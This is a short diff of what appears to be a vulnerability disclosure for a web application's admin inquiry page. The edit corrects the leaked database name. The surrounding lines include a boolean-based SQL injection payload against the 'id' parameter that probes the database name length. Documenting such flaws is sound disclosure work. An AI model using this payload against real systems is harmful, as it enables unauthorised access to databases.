@@ -8,7 +8,7 @@ Vulnerability File: /psrs/admin/?page=inquiries/view_inquiry&id=
 
 Vulnerability location: /psrs/admin/?page=inquiries/view_inquiry&id=, id
 
-Current database name: hsrs_db ,length is 7
+Current database name: psrs_db ,length is 7
 
 [+] Payload: /psrs/admin/?page=inquiries/view_inquiry&id=4%27%20and%20length(database())%20=7--+ // Leak place ---> id
 
